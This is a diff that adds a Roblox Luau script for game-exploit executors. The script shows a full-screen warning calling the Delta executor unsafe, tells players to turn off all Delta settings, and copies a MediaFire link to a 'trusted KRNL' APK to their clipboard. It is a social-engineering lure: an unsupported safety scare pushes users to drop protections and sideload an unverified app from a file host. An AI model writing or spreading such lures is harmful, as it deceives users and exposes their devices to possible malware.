@@ -1,0 +1,78 @@
+-- TEST MODE: Always show UI
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local StarterGui = game:GetService("StarterGui")
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "DeltaWarningUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+ScreenGui.Parent = game:GetService("CoreGui")
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(1, 0, 1, 0)
+Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Frame.BorderSizePixel = 0
+Frame.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -40, 0, 50)
+Title.Position = UDim2.new(0, 20, 0.2, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "DELTA EXECUTOR IS CONSIDERED UNSAFE AND WILL NOT RUN THIS SCRIPT."
+Title.Font = Enum.Font.SourceSansBold
+Title.TextColor3 = Color3.fromRGB(255, 75, 75)
+Title.TextScaled = true
+Title.TextWrapped = true
+Title.Parent = Frame
+
+local Message = Instance.new("TextLabel")
+Message.Size = UDim2.new(1, -40, 0, 60)
+Message.Position = UDim2.new(0, 20, 0.3, 0)
+Message.BackgroundTransparency = 1
+Message.Text = "This script will only work if all Delta settings are turned off.\nAlternatively, use the trusted KRNL executor instead."
+Message.Font = Enum.Font.SourceSans
+Message.TextColor3 = Color3.fromRGB(255, 255, 255)
+Message.TextScaled = true
+Message.TextWrapped = true
+Message.Parent = Frame
+
+local CopyBox = Instance.new("TextButton")
+CopyBox.Size = UDim2.new(0, 350, 0, 50)
+CopyBox.Position = UDim2.new(0.5, -175, 0.5, 0)
+CopyBox.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
+CopyBox.Text = "[ COPY KRNL EXECUTOR LINK ]"
+CopyBox.Font = Enum.Font.SourceSansBold
+CopyBox.TextColor3 = Color3.new(1, 1, 1)
+CopyBox.TextScaled = true
+CopyBox.Parent = Frame
+
+CopyBox.MouseButton1Click:Connect(function()
+    setclipboard("https://www.mediafire.com/file/t1xo5ra2ti07lhd/krnl_release_2.681.805_2025.7.14_37.apk/file")
+    StarterGui:SetCore("SendNotification", {
+        Title = "Copied",
+        Text = "KRNL link copied to clipboard.",
+        Duration = 3
+    })
+end)
+
+local Countdown = Instance.new("TextLabel")
+Countdown.Size = UDim2.new(1, -40, 0, 30)
+Countdown.Position = UDim2.new(0, 20, 1, -40)
+Countdown.BackgroundTransparency = 1
+Countdown.Text = "Closing in 15 seconds..."
+Countdown.Font = Enum.Font.SourceSansBold
+Countdown.TextColor3 = Color3.fromRGB(255, 50, 50)
+Countdown.TextScaled = true
+Countdown.TextWrapped = true
+Countdown.Parent = Frame
+
+local secondsLeft = 15
+while secondsLeft > 0 do
+    Countdown.Text = "Closing in " .. secondsLeft .. " seconds..."
+    wait(1)
+    secondsLeft -= 1
+end
+
+ScreenGui:Destroy()
